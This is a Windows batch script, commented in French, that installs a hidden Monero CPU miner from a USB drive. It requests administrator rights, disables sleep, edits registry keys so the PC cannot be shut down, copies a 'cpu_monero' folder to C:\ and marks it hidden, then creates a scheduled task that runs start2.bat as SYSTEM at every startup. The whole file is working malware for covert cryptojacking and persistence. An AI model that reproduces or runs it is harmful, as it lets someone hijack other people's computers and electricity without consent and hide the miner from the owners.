@echo off
:: Vérifier si le script est exécuté en tant qu'administrateur
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Admin privileges confirmed.
) else (
    echo Requesting admin privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Désactiver la mise en veille mais laisser l'écran s'éteindre
powercfg /change standby-timeout-ac 0
powercfg /change monitor-timeout-ac 5

:: Empêcher l’arrêt du PC (remplace le bouton d’arrêt par un redémarrage)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v PowerdownAfterShutdown /t REG_DWORD /d 0 /f

:: Désactiver l'arrêt du PC via le bouton d'alimentation
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f

:: Définir les chemins
set "sourcePath=cpu_monero"
set "destinationPath=C:\cpu_monero"

:: Copier le dossier de l'USB vers C:\
xcopy "%sourcePath%" "%destinationPath%" /E /H /C /I /Y

:: Rendre le dossier caché
attrib +h "%destinationPath%"

:: Entrer dans le dossier copié
cd /d "%destinationPath%"

:: Vérifier si le fichier start2.bat existe
if exist "start2.bat" (
    :: Supprimer l'ancienne tâche planifiée si elle existe
    schtasks /query /tn "Start2Task" >nul 2>&1
    if %errorLevel% == 0 (
        echo Suppression de la tâche planifiée existante...
        schtasks /delete /tn "Start2Task" /f
    )

    :: Créer une tâche planifiée pour exécuter start2.bat immédiatement après le démarrage
    echo Création de la tâche planifiée...
    schtasks /create /tn "Start2Task" /tr "%destinationPath%\start2.bat" /sc onstart /ru System
    echo Tâche planifiée créée pour exécuter start2.bat immédiatement après le démarrage.
) else (
    echo Le fichier start2.bat n'a pas été trouvé dans le dossier copié.
)

:: Fin du script
echo Opération terminée.
